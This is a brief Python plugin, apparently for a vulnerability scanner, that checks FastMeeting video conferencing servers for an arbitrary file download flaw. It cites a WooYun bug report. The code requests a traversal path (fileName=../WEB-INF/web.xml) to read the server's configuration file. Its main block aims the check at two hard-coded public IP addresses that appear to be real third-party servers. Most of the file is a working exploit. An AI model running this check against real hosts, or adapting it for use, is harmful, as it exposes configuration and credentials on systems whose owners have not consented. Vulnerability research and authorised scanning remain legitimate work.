#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 好视通视频会议系统(fastmeeting)任意文件遍历
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0143719
description:
    dbbackup/adminMgr/download.jsp?fileName=../../dbbackup/adminMgr/download.jsp
    
'''

def assign(service, arg):
    if service == 'fastmeeting':
        return True, arg

def audit(arg):
    UA = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36'
    url = arg + 'dbbackup/adminMgr/download.jsp?fileName=../WEB-INF/web.xml'
    code, head, res, err, _ = curl.curl2(url, user_agent=UA)
    if (code == 200) and ('<?xml version' in res) and ('<servlet>' in res):
        security_hole("Arbitrary file download:" + url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('fastmeeting', 'http://116.255.207.210:8080/')[1])
    audit(assign('fastmeeting', 'http://121.8.160.118:8080/')[1])